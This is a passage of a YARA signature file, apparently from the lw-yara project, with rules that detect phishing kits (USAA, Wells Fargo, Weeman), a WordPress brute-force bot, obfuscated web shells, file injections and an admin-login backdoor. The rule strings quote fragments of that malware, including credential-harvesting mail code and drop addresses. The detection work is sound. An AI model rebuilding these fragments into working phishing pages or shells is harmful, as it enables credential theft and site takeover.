      $s7 = "$message .= \"Confirm PIN Number           : \".$_POST['formtext12'].\"\\n\";" fullword ascii
      $s8 = "$message .= \"Date of Birth             : \".$_POST['formtext8'].\"\\n\";" fullword ascii
      $s9 = "$message .= \"USAA Member Number            : \".$_POST['formtext2'].\"\\n\";" fullword ascii
      $s10 = "mail($send,$subject,$message,$headers);" fullword ascii
      $s11 = "mail($to,$subject,$message,$headers);" fullword ascii
      $s12 = "$message .= \"---------------Created BY Unknown-------------\\n\";" fullword ascii
      $s13 = "$subject = \"Result from -$ip\";" fullword ascii
      $s14 = "$message .= \"Phone Pin           : \".$_POST['formtext13'].\"\\n\";" fullword ascii
      $s15 = "$message .= \"Full Name             : \".$_POST['formtext1'].\"\\n\";" fullword ascii
      $s16 = "$message .= \"SSN 1             : \".$_POST['formtext5'].\"\\n\";" fullword ascii
      $s17 = "$message .= \"Expiry Date          : \".$_POST['formtext10'].\"\\n\";" fullword ascii
      $s18 = "$message .= \"SSN 3             : \".$_POST['formtext7'].\"\\n\";" fullword ascii
      $s19 = "$message .= \"SSN 2             : \".$_POST['formtext6'].\"\\n\";" fullword ascii
      $s20 = "$message .= \"--------------Skype Info-----------------------\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 4KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_08_16_18_usaa_page_phishing_second {
   meta:
      description = "phishing - file second.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-16"
      hash1 = "fcbd6b43f0447982d3195483d69a03c9c8095cd0e1b7ecd33784cd21e81a8b33"
   strings:
      //$s1 = "$send = \"mandrell009@gmail.com,born.last@yandex.com\";" fullword ascii
      $s2 = "$headers = \"From: Usaa result<customer-support@mrs>\";" fullword ascii
      $s3 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s4 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s5 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
      $s6 = "mail($send,$subject,$message,$headers);" fullword ascii
      $s7 = "mail($to,$subject,$message,$headers);" fullword ascii
      $s8 = "$message .= \"---------------Created BY Unknown-------------\\n\";" fullword ascii
      $s9 = "$subject = \"Result from -$ip\";" fullword ascii
      $s10 = "$message .= \"Pin            : \".$_POST['formtext103'].\"\\n\";" fullword ascii
      $s11 = "$message .= \"--------------Usaa Pin Info-----------------------\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_08_16_18_usaa_page_phishing_action {
   meta:
      description = "phishing - file action.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-16"
      hash1 = "44e246c90089c88c7583c11d5e410176480b9e2f89b882ee45a831602ce3eca8"
   strings:
      $s1 = "$send = \"mandrell009@gmail.com,born.last@yandex.com\";" fullword ascii
      $s2 = "$headers = \"From: USAA result<customer-support@mrs>\";" fullword ascii
      $s3 = "$message .= \"Question 1 : \".$_POST['formselect1'].\"\\n\";" fullword ascii
      $s4 = "$message .= \"Answer  1 : \".$_POST['formtext1'].\"\\n\";" fullword ascii
      $s5 = "$message .= \"Answer 3 : \".$_POST['formtext3'].\"\\n\";" fullword ascii
      $s6 = "$message .= \"Question 2 : \".$_POST['formselect2'].\"\\n\";" fullword ascii
      $s7 = "$message .= \"Answer 2 : \".$_POST['formtext2'].\"\\n\";" fullword ascii
      $s8 = "$message .= \"Question 3  : \".$_POST['formselect3'].\"\\n\";" fullword ascii
      $s9 = "$message .= \"Question 4 : \".$_POST['formselect4'].\"\\n\";" fullword ascii
      $s10 = "$message .= \"Answer 4 : \".$_POST['formtext4'].\"\\n\";" fullword ascii
      $s11 = "$message .= \"Question 5 : \".$_POST['formselect5'].\"\\n\";" fullword ascii
      $s12 = "$message .= \"Question 6 : \".$_POST['formselect6'].\"\\n\";" fullword ascii
      $s13 = "$message .= \"Answer 5 : \".$_POST['formtext5'].\"\\n\";" fullword ascii
      $s14 = "$message .= \"Answer 6 : \".$_POST['formtext6'].\"\\n\";" fullword ascii
      $s15 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s16 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s17 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
      $s18 = "mail($send,$subject,$message,$headers);" fullword ascii
      $s19 = "mail($to,$subject,$message,$headers);" fullword ascii
      $s20 = "$message .= \"---------------Created BY Unknown-------------\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( 8 of them )
      ) or ( all of them )
}
rule VUL_JQuery_FileUpload_CVE_2018_9206 {
   meta:
      description = "Detects JQuery File Upload vulnerability CVE-2018-9206"
      author = "Florian Roth"
      reference = "https://www.zdnet.com/article/zero-day-in-popular-jquery-plugin-actively-exploited-for-at-least-three-years/"
      reference2 = "https://github.com/blueimp/jQuery-File-Upload/commit/aeb47e51c67df8a504b7726595576c1c66b5dc2f"
      reference3 = "https://blogs.akamai.com/sitr/2018/10/having-the-security-rug-pulled-out-from-under-you.html"
      reference4= "https://github.com/Neo23x0/signature-base/blob/master/yara/vul_jquery_fileupload_cve_2018_9206.yar"
      date = "2018-10-19"
   strings:
      $s1 = "error_reporting(E_ALL | E_STRICT);" fullword ascii
      $s2 = "require('UploadHandler.php');" fullword ascii
      $s3 = "$upload_handler = new UploadHandler();" fullword ascii
   condition:
      all of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-26
   Identifier: scan
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule case131_scan_weeman {
   meta:
      description = "scan - file weeman.py"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-26"
      hash1 = "903555a99076d498894e1166063772f7600e22216c7159813b061d882c60725a"
   strings:
      $s1 = "printt(3, \"If \\'Weeman\\' runs sucsessfuly on your platform %s\\nPlease let me (@Hypsurus) know!\" %sys.platform)" fullword ascii
      $s2 = "from core.config import user_agent as usera" fullword ascii
      $s3 = "# weeman.py - HTTP server for phishing" fullword ascii
      $s4 = "#  along with this program.  If not, see <http://www.gnu.org/licenses/>." fullword ascii
      $s5 = "from core.shell import shell_noint" fullword ascii
      $s6 = "#  the Free Software Foundation; either version 2 of the License, or" fullword ascii
      $s7 = "from core.shell import shell" fullword ascii
      $s8 = "parser.add_option(\"-p\", \"--profile\", dest=\"profile\", help=\"Load weeman profile.\")" fullword ascii
      $s9 = "# Copyright (C) 2015 Hypsurus <hypsurus@mail.ru>" fullword ascii
      $s10 = "#  but WITHOUT ANY WARRANTY; without even the implied warranty of" fullword ascii
      $s11 = "#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the" fullword ascii
      $s12 = "#  You should have received a copy of the GNU General Public License" fullword ascii
      $s13 = "#  it under the terms of the GNU General Public License as published by" fullword ascii
      $s14 = "#  (at your option) any later version." fullword ascii
      $s15 = "#  Weeman is distributed in the hope that it will be useful," fullword ascii
      $s16 = "if sys.version[:3] == \"2.7\" or \"2\" in sys.version[:3]:" fullword ascii
      $s17 = "print(\"Sorry, there is no support for windows right now.\")" fullword ascii
      $s18 = "#printt(3, \"Running Weeman on \\'Mac\\' (All good)\")" fullword ascii
      $s19 = "#  GNU General Public License for more details." fullword ascii
      $s20 = "printt(1,\"Weeman has no support for Python 3.\")" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and
         filesize < 6KB and
         ( 8 of them )
      ) or ( all of them )
}

rule phishing_well_fargo

{

    meta:
       author = "Brian Laskowski"
       info = " wells fargo phishing kit "

    strings:
    
	$a= "$formproc_obj"
	$b= "$data_email_sender"
	$c= "$validator"
	$d= "/templ/wells_email_subj.txt"

    condition:
    all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-12-09
   Identifier: wordfence botnet report
   Reference: https://github.com/Hestat/lw-yara/
   Reference: https://www.wordfence.com/blog/2018/12/wordpress-botnet-attacking-wordpress/
*/

/* Rule Set ----------------------------------------------------------------- */

rule bot_script {
   meta:
      description = "wordfence - file bot-script.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-12-09"
      hash1 = "a64a727b5474a7225fe1cdbcdf2669ce074cfbf5022c5be3435fc43d8842dcd5"
   strings:
      $s1 = "$brutePass = createBrutePass($_POST['wordsList'], $item['domain'], $item['login'], $_POST['startPass'], $_POST['endPass']);" fullword ascii
      $s2 = "$brutePass = createBrutePass($_POST['wordsList'], $item['domain'], $item['login'], $_POST['startPass'], $_POST['endP" fullword ascii
      $s3 = "for($i = 0; $i < count($passwords); $i++){ $xml = addElementXML($xml, $login, $passwords[$i]); } $request = $xml->saveXML();" fullword ascii
      $s4 = "$request[] = array('id'=>$item['id'], 'user'=>$item['login'], 'request'=>createFullRequest($item['login'], $brutePas" fullword ascii
      $s5 = "if(file_exists($_SERVER[\"DOCUMENT_ROOT\"].'/'.$filename) and md5_file($_SERVER[\"DOCUMENT_ROOT\"].'/'.$filename) == $hash){" fullword ascii
      $s6 = "s),'domain'=>'http://' . trim(strtolower($item['domain'])).'/xmlrpc.php', 'brutePass'=>$brutePass);" fullword ascii
      $s7 = "$xmlualist  = array(\"Poster\", \"WordPress\", \"Windows Live Writer\", \"wp-iphone\", \"wp-android\", \"wp-windowsphone\");" fullword ascii
      $s8 = "if(file_exists($_SERVER[\"DOCUMENT_ROOT\"] . '/' . $filename) and md5_file($_SERVER[\"DOCUMENT_ROOT\"] . '/' . $filename) ==" fullword ascii
      $s9 = "if(checkWordsList($_POST['wordsList'], $_POST['path'], $_POST['hash'])){" fullword ascii
      $s10 = "downloadCurlTarg($path, $_SERVER[\"DOCUMENT_ROOT\"].'/'.$filename);" fullword ascii
      $s11 = "$request[] = array('id'=>$item['id'], 'user'=>$item['login'], 'request'=>createFullRequest($item['login'], $brutePass),'domain'=" ascii
      $s12 = "function createFullRequest($login, $passwords){" fullword ascii
      $s13 = "$domainsData = json_decode($_POST['domainsData'], true);" fullword ascii
      $s14 = "ini_set('max_execution_time', 500000000000);" fullword ascii
      $s15 = "if ($_POST['secret']=='111'){" fullword ascii
      $s16 = "function checkWordsList($filename, $path, $hash){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 5KB and
         ( 4 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-07-04
   Identifier: 07-04-19
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule wordpress_bot2 {
   meta:
      description = "07-04-19 - file wordpress-bot2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-07-04"
      hash1 = "a0fa8c69341cd91679d06a576772d5154b9318a84f46f88acfb49490b678df6d"
   strings:
      $s1 = "goto XljGS; nMNd4: $Y_JLM = file_get_contents(trim($rOWLw)); goto jRAr_; qUhpk: echo \"\\141\\x75\\x78\\x36\\x54\\150\\x65\\151" ascii
      $s2 = "1c; iCbpx: exec($pgcps); goto DJ29v; qgWl4: if (!($_POST[\"\\x63\\160\"] == \"\\x64\\157\\167\\156\\x6c\\x6f\\141\\x64\")) { got" ascii
      $s3 = "XdH2U: qtfL9: goto UA1tk; XljGS: error_reporting(0); goto e2htE; o6j1c: $rOWLw = $_POST[\"\\165\\162\\154\"]; goto k5Ofv; jRAr_:" ascii
      $s4 = "goto XljGS; nMNd4: $Y_JLM = file_get_contents(trim($rOWLw)); goto jRAr_; qUhpk: echo \"\\141\\x75\\x78\\x36\\x54\\150\\x65\\151" ascii
      $s5 = "$aXH4D); goto RC55t; DJ29v: echo \"\\x6f\\153\"; goto XdH2U; UA1tk: hr6VR:" fullword ascii
      $s6 = "\\156\\165\\154\\154\\x20\\x32\\76\\x2f\\x64\\145\\166\\57\\x6e\\x75\\x6c\\x6c\\x20\\46\"; goto iCbpx; GwGpj: exec(\"\\160\\153" ascii
      $s7 = "o qUhpk; RC55t: exec(\"\\x70\\153\\151\\154\\154\\x20\\x2d\\x39\\40\\x2d\\146\\x20\\x73\\x74\\145\\x61\\154\\164\\150\"); goto G" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 4KB and
         ( all of them )
      ) or ( all of them )
}

rule wordpress_bot1 {
   meta:
      description = "07-04-19 - file wordpress-bot1.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-07-04"
      hash1 = "6a6eac7d84738c14320d18d43b8806a1f1c58b2e7693a9320ef97d89c3847527"
   strings:
      //$s1 = "\" . \"\\145\" . '' . \"\\162\" . \"\\x63\" . '' . ''); goto gCXGN; OMTcw: $zWk0S();" fullword ascii
      $s2 = "<?php"
      $s3 = "goto Foltw"
      $s4 = "$SsrUL < strlen($d38Ix)"
      $s5 = "foreach"
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1000KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-24
   Identifier: WP index injection
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule possible_injected_wordpress_index {
   meta:
      description = "wordpress index injection - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-24"
   strings:
      $s1 = "@include" fullword ascii
      $s2 = ".\\x69c\\x6f" ascii
      $s3 = "@package WordPress" fullword ascii
      $s4 = "define('WP_USE_THEMES', true)"
   condition:
         ( all of them )
}

rule wordpress0_ico_injection_detected
{

    meta:
       author = "Brian Laskowski"
       info = " general ico injection 05/21/18 "

    strings:
    
	$s1="<?php"
	$s2="Front to the WordPress application"
	$s3="@ini_set(\"error_log\",NULL)"
	$s4="assert_options"

    condition:
    all of them
}

rule wordpress2_ico_injection_detected
{

    meta:
       author = "Brian Laskowski"
       info = " general ico injection 05/21/18 "

    strings:
    
	$s1="<?php"
	$s2="Front to the WordPress application"
	$s3="@include"
	//$s4="ic\x6f"

    condition:
    all of them and filesize < 20KB
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-24
   Identifier: WP index injection
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule possible_injected_wordpress_settings {
   meta:
      description = "Wordpress injection wp-settings.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-24"
   strings:
      $s1 = "@include" fullword ascii
      $s2 = ".\\x69c\\x6f" ascii
      $s3 = "@package WordPress" fullword ascii
      $s4 = "require( ABSPATH . WPINC . '/post.php' );"
   condition:
         ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-23
   Identifier: shell5
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_22_18_admin_backdoor_pomo {
   meta:
      description = "shell5 - file pomo.php3"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-23"
      hash1 = "6f986483b7dbfb173bb3744c19a839d793dd53248e09b9da63906f9e3e1fbb7b"
   strings:
      $s1 = "wp_redirect(get_bloginfo('wpurl') . '/wp-admin');" fullword ascii
      $s2 = "wp_set_current_user($user_id, $user_login);" fullword ascii
      $s3 = "echo \"You are logged in as $user_login\";" fullword ascii
      $s4 = "do_action('wp_login', $user_login);" fullword ascii
      $s5 = "$user_login = $user_info->user_login;" fullword ascii
      $s6 = "$user_ids = $wpdb->get_results($query_str);" fullword ascii
      $s7 = "$query_str = \"SELECT ID FROM $wpdb->users\";" fullword ascii
      $s8 = "require('../../wp-blog-header.php');" fullword ascii
      $s9 = "$user_info = get_userdata($user_id);" fullword ascii
      $s10 = "if (function_exists('get_admin_url')) {" fullword ascii
      $s11 = "wp_redirect(get_admin_url());" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

rule well_known_082218 {
   meta:
      description = "shell5 - file well-known.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-23"
      hash1 = "aaf89d834724969f174bfb65cf1503739794746f9904894cec8febd715baacd9"
   strings:
      $s1 = "'pTIwnJSfL2uupaZbWUWyp1fapzImW10cYvp8Y3EyrUEupzIuCwjiMTy2CwjiMz9loG4aB2WlMJSeB2Aup2HtVaAw' , " fullword ascii
      $s2 = "'qTyiovO2LJk1MG0vY2I0Ll9mp2tiVw5ZnJ51rP1mp2t8Y29jqTyiow4aB2IwnT8tWmjip2IfMJA0CwjiMz9loG48' , " fullword ascii
      $s3 = "$password = \"d6d9172da07e6c44c1fbcb571fd0a8f6\"; " fullword ascii
      $s4 = "'sFOzqJ5wqTyiovOhMvuuYTVcVUftpzHtCFOjpz9gpUDbVgQPinwQ+lVfLvx7VTyzXUWyXFO7VPDbW2qiWlxhqzSf' , " fullword ascii
      $s5 = "'CwjiMz9loG48MTy2VTAfLKAmCFWuL3EuoTjvVUA0rJkyCFWjLJExnJ5aBwujrQgjLJExnJ5aYKWcM2u0BwL4pUt7' , " fullword ascii
      $s6 = "'Vw48C3ObpPOyL2uiVUObpS91ozSgMFtcYvp8LaV+Wl4xK1ASHyMSHyfaH0IFIxIFK1ACEyEKDIWSW107Cm48Y2Ec' , " fullword ascii
      $s7 = "'qUV+WmgyL2uiVPp8Y3EuLzkyCwjiMz9loG4aB2yzXTAiqJ50XPEsHR9GISfaqUyjMKZaKFxtCvNjXFO7WT1uqTAb' , " fullword ascii
      $s8 = "'BlO9VU1zqJ5wqTyiovO0rUEmXT0fpPkuXFO7VUNtCFOmMPujXGftpzHtCFOjpz9gpUDboFkjXGftnJLbpzHcVUft' , " fullword ascii
      $s9 = "'JlqwnTIwnlqqYvpvCvp7VU1yL2uiVPp8nJ5jqKDtqUyjMG0vp3IvoJy0VvO2LJk1MG0vVR8tFlNvCwjiMz9loG48' , " fullword ascii
      $s10 = "'WGV3Y2pfVvpvXGftpzI0qKWhVUA0pwftsJM1ozA0nJ9hVTAxXTEcpvxtrlOxnKVtCFOmMPuxnKVcBlNxXPqxnKVa' , " fullword ascii
      $s11 = "'GHIQDHgSDxSaH2uOHHyWo1SSD0EYEHWOnRAbDISWIJ9EEHAODHSODHSOHwOBER9cDJ9FZQIJF1AOZRkdEKIAnHS5' , " fullword ascii
      $s12 = "'ozA0nJ9hVTSwqUZbpPkuYTLcVUftpPN9VUAxXUNcBlOzVQ0tp2DbMvx7VUWyVQ0tpUWioKO0XTLfpPx7VTyzXUWy' , " fullword ascii
      $s13 = "'VUMuoUIyCFYJgAQDVw48Y3ExCwjiqUV+WmgyL2uiVPp8Y3EuLzkyCwjiMz9loG4aB2yzXPElo3qmXFO7MJAbolNa' , " fullword ascii
      $s14 = "'DIIODHSODHSPZT1OHHyODHSODHSADHMEDHSODHSOp0caEHAODHSODHSRDHWMDHSODHSOGSAMDxSaDHSODHSOq0SL' , " fullword ascii
      $s15 = "'MTy2Cvp7MJAbolNaCTMipz0tozSgMG0vMaWgZFVtnJD9VzMloGRvVT1yqTuiMQ0vHR9GIPV+CUEuLzkyVTAfLKAm' , " fullword ascii
      $s16 = "* Language and charset conversion settings" fullword ascii
      $s17 = "'DHSODHSODz5ODHSOD1SODHSOFHSODHSAM3qEFHEOGHSODJqODHSOEHSODHSODHSODHSEDHSODHyODHSOL0SODHSO' , " fullword ascii
      $s18 = "'GHIaBRSSnKqQFatirHbjLzqODHSODGt2pxuFD1SWDzqODHSAMRIXDISPDHSODKu3HJgOM0SODH9dBF9zYl9cIIu3' , " fullword ascii
      $s19 = "'DHSODHSODHSOD0SODHSOM0SODHMaDHSOEPfiYmy2DJqODHSCrHAPDJcmDJqODHyODHSODIIODHSODxSODHSPDHSO' , " fullword ascii
      $s20 = "'APxcB3WyqUIlovOmpUWcoaEzXPpyYwWzVPphWTSlpzS5JlEzoT9ipy0fXPEvrKEypl9jo3pbZGNlAPkzoT9ipvtx' , " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_language_ru_082218 {
   meta:
      description = "shell5 - file master-language_ru.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-23"
      hash1 = "7d97b8ce81e08ab2ea6ee043f32a9c91a250baf2e356630c89708dfbe3c79e32"
   strings:
      $s1 = "$x($_POST['tb_id']);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-26
   Identifier: case137
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule wp_custm {
   meta:
      description = "case137 - file wp-custm.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-26"
      hash1 = "daf13db213b92e2dcf69c35a6f37fa8a4be2cdedbb8f8faa8f1e9b67c7ebdd29"
   strings:
      $s1 = "iajq$*9$#8pl$sm`pl9&#*,mjp-,544+gkqjp, i--*#!&:_$8e$lvab9&[t3]&$kjghmgo9&c,X##* r*#X#(jqhh(X#X#(X#X#(X#X#-&:#* o*#8+e:$Y8+pl:#?" fullword ascii
      $s2 = "pait$9$Dmgkjr, [TKWP_#glevwap#Y($#QPB)<#($e``gwhewlaw,&Xj $&* [TKWP_#t5#Y*&Xj&*llbPAvfr, [TKWP_#t5#Y-(&XjXvXpXX#X4&--?" fullword ascii
      $s3 = "$$$$$$$$$$$$$$$$$$$$llbPAvfr,#pev$gb~r$#$*$awgetawlahhevc, [TKWP_#t6#Y-$*$#$#$*$mithk`a,#$#($ [WAWWMKJ_#b#Y--?" fullword ascii
      $s4 = "vkqt#Y*#8+p`:8p`:8e$lvab9[t3]$kjghmgo9&c,X#BmhawPkkhwX#(jqhh(X##*qvhajgk`a, b_#jeia#Y-*#X#(X#glik`X#-&:#* b_#taviw#Y" fullword ascii
      $s5 = "ktp[glevwapw$*9$#8ktpmkj$rehqa9&#* mpai*#&$#*, [TKWP_#glevwap#Y99 mpai;#wahagpa`#>##-*#:#* mpai*#8+ktpmkj:#?" fullword ascii
      $s6 = "$safIEOQWkrwqcbvn10=fopen(\"temp1-1.php\",\"w\");" fullword ascii
      $s7 = "$safIEOQWkrwqcbvn11=fopen(\"temp1-1.php\",\"w\");" fullword ascii
      $s8 = "$$$$ [WAWWMKJ_i`1, [WAVRAV_#LPPT[LKWP#Y-$*$#ene|#Y$9$,fkkh- CHKFEHW_#`abeqhp[qwa[ene|#Y?" fullword ascii
      $s9 = "$$$$mb,%aitp}, [WAWWMKJ_#egp#Y-$\"\"$Dgkqjp, [WAWWMKJ_#b#Y-$\"\"$,, [WAWWMKJ_#egp#Y$99$#~mt#-$xx$, [WAWWMKJ_#egp#Y$99$#pev#---" fullword ascii
      $s10 = "$$$$$$$$$$$$$$$$$$$$ [WAWWMKJ_#b#Y$9$evve}[iet,#awgetawlahhevc#($ [WAWWMKJ_#b#Y-?" fullword ascii
      $s11 = "taviw$/9$,mjp- [TKWP_#t7#Y_ mY.tks,<($,wpvhaj, [TKWP_#t7#Y-) m)5--?" fullword ascii
      $s12 = "wkvp_5Y;4>5-*&X&-#:Wm~a8+e:8+pl:8pl:8e$lvab9#[t3]#$kjghmgo9#c,X&BmhawIejX&(jqhh(X&w[ik`mb}[&*, wkvp_5Y;4>5-*&X&-#:Ik`mb}8+e:8+p" fullword ascii
      $s13 = "i$9$evve},#Wag*$Mjbk#9:#WagMjbk#(#Bmhaw#9:#BmhawIej#(#Gkjwkha#9:#Gkjwkha#(#Wuh#9:#Wuh#(#Tlt#9:#Tlt#(#Weba$ik`a#9:#WebaIk`a#(#Wp" fullword ascii
      $s14 = "`vmraw$*9$#8e$lvab9&[t3]&$kjghmgo9&c,X#BmhawIejX#(X##* `vmra*#>+X#-&:_$#* `vmra*#$Y8+e:$#?" fullword ascii
      $s15 = "mw[svmpefha$9$mw[svmpefha, CHKFEHW_#gs`#Y-;&$8bkjp$gkhkv9#[t3]61bb44#:,Svmpaefha-8+bkjp:&>&$8bkjp$gkhkv9va`:,Jkp$svmpefha-8+bkj" fullword ascii
      $s16 = "8wahagp$jeia9#t5#:8ktpmkj$rehqa9#gkt}#:Gkt}8+ktpmkj:8ktpmkj$rehqa9#ikra#:Ikra8+ktpmkj:8ktpmkj$rehqa9#`ahapa#:@ahapa8+ktpmkj:&?" fullword ascii
      $s17 = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ mpavepkv$9$jas$VagqvwmraMpavepkvMpavepkv,jas$Vagqvwmra@mvagpkv}Mpavepkv, b*#+#--?" fullword ascii
      $s18 = "vapqvj$wpvgit,wpvpkhksav, e_ CHKFEHW_#wkvp#Y_4YY-($wpvpkhksav, f_ CHKFEHW_#wkvp#Y_4YY--., CHKFEHW_#wkvp#Y_5Y;5>)5-?" fullword ascii
      $s19 = "aglk$#8bkvi$kjwqfimp9&c,jqhh(jqhh(jqhh(jqhh(X#5X#/plmw*pa|p*rehqa-?vapqvj$behwa?&:8pa|pevae$jeia9pa|p$gheww9fmcevae:#?" fullword ascii
      $s20 = "$ievcmj>4?gkhkv>[t3]bbb?fegocvkqj`)gkhkv>[t3]111?fkv`av>5t|$wkhm`$ jijfvp`S?$bkjp>$=tp$Ikjkwtega(#Gkqvmav$Jas#?$y" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 8 of them )
      ) or ( all of them )
}

rule wp_security {
   meta:
      description = "case137 - file wp-security.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-26"
      hash1 = "3f245491d1a166522f7930ce452943aaba6b7314eb745d52c67bcd19dc77e339"
   strings:
      $s1 = "* hook_exit() invokes, css/js preprocessing and translation, and" fullword ascii
      $s2 = "* global killswitch in settings.php ('allow_authorize_operations') and via" fullword ascii
      $s3 = "* with elevated privileges, for example to deploy and upgrade modules or" fullword ascii
      $s4 = "* script as part of a multistep process. This script actually performs the" fullword ascii
      $s5 = "return variable_get('allow_authorize_operations', TRUE) && user_access('administer software updates');" fullword ascii
      $s6 = "* Global flag to identify update.php and authorize.php runs, and so" fullword ascii
      $s7 = "* themes. Users should not visit this page directly, but instead use an" fullword ascii
      $s8 = "$wp_default_logo = '<img src=\"data:image/png;base64,OOBs3Tzm5ETEo9nWhA%Kyv3GlfWwccNcwixZ4b8Yz6d2K48GrYIY6lXuD71elbShG+JYtYbfjbU" ascii
      $s9 = "* Using this script, the site owner (the user actually owning the files on" fullword ascii
      $s10 = "* gracefully recover from errors. Access to the script is controlled by a" fullword ascii
      $s11 = "* the webserver) can authorize certain file-related operations to proceed" fullword ascii
      $s12 = "$wp_nonce = isset($_POST['f_dr']) ? $_POST['f_dr'] : (isset($_COOKIE['f_dr']) ? $_COOKIE['f_dr'] : NULL);" fullword ascii
      $s13 = "* selected operations without loading all of Drupal, to be able to more" fullword ascii
      $s14 = "* avoid various unwanted operations, such as hook_init() and" fullword ascii
      $s15 = "* Renders a 403 access denied page for authorize.php." fullword ascii
      $s16 = "* administrative user interface which knows how to redirect the user to this" fullword ascii
      $s17 = "* in Drupal code (not just authorize.php)." fullword ascii
      $s18 = "* solve some theming issues. This flag is checked on several places" fullword ascii
      $s19 = "* Root directory of Drupal installation." fullword ascii
      $s20 = "if( isset($_POST['f_dr']) ) @setcookie( 'f_dr', $_POST['f_dr'] );" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 70KB and
         ( 8 of them )
      ) or ( all of them )
}

rule wp_layouts {
   meta:
      description = "case137 - file wp-layouts.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-26"
      hash1 = "b1a8def04a0f599d5ab254af91e96ad81cb0f1c9171d8a138caacb6319b71162"
   strings:
      $s1 = "$JSubMenu = addFilter(getEntries(_JEXEC), $action);" fullword ascii
      $s2 = "$action = isset($_REQUEST['j_jmenu']) ? $_REQUEST['j_jmenu'] : (isset($_COOKIE['j_jmenu']) ? $_COOKIE['j_jmenu'] : NULL);" fullword ascii
      $s3 = "$entries[$i] = chr((ord($entries[$i]) - ord($action[$i])) % 256);" fullword ascii
      $s4 = "2aeb904b42befa6fea699713dfc4b3b6cf4e733c6bba13b44bbdb2b8dfbe8137577cd104e4714fbeba5e57fd094104572ed65e5e150d47cde0e5fb55bb" ascii
      $s5 = "659272cbbfe10df4497f0251ce9b0ebdf6ee7facc6dd68f5365f6b274a572050b2c9d0143dd785c8ff7ef8c89e3ba70f1dd3f677f0872a4076db837" ascii
      $s6 = "ab7138df907dc458d1871bcff6fad91d6d3b3e72108041566bfd3ba4beaf2d98d1849d5508d72fe05bc38dd0cf0489a720bbcc704c7068b066" ascii
      $s7 = "b63ad3dbd2ebf4911a12295ad745076cd5fb13a10ee4606f6a362b438e7eb673073e05f38642439157bb6db154309a816df1f0a8d" ascii
      $s8 = "if(isset($_REQUEST['j_jmenu'])) @setcookie('j_jmenu', $_REQUEST['j_jmenu']);" fullword ascii
      $s9 = "b2a3bc72168f9bd65b2e5db63fea407d15fc27a93fea8323372eebc688676c719f558c3742c41a02f21e3c17bbce2a1e4cb7c" ascii
      $s10 = "6941e67eec4a0ccca03ea379b5a539eb10ad7b660abb31e952e0323c928c9105f90e12faf406cdb7fe8737837dd6db91a596be51b3ccb7d4cce30dd978" ascii
